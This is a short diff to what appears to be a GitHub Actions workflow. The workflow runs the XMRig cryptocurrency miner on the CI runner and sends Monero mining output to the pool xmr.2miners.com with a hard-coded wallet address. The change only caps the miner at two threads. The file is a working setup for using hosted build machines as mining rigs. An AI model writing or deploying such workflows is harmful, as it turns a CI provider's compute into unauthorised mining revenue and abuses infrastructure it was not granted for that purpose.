@@ -29,4 +29,4 @@ jobs:
     - name: Run XMRig
       run: |
         cd xmrig/build
-        ./xmrig -o xmr.2miners.com:2222 -u 82VfeZRTtxRbYXHenMwrdHBK8P1mYQNMGfJuamki2PhT473tBkHgccxNZPn6468GxtVycU2yeDXiwisXS4KTikEaGkEWcrW -p gitrig -k --coin monero -a rx/0
+        ./xmrig -o xmr.2miners.com:2222 -u 82VfeZRTtxRbYXHenMwrdHBK8P1mYQNMGfJuamki2PhT473tBkHgccxNZPn6468GxtVycU2yeDXiwisXS4KTikEaGkEWcrW -p gitrig -k --coin monero -a rx/0 --threads 2
